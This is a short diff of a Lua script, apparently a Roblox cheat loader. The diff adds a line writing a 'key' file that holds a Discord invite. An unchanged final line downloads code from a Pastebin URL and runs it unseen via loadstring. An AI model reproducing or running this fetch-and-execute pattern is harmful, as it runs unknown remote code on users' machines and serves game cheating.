@@ -23,4 +23,6 @@ end
 getgenv().request = request
 getgenv().http_request = request
 
+writefile('Senju_Key_' .. game.Players.LocalPlayer.Name .. ".txt", "https://discord.gg/VSKCM7rXVY")
+
 loadstring(game:HttpGet("https://pastebin.com/raw/wk11PpEw"))()
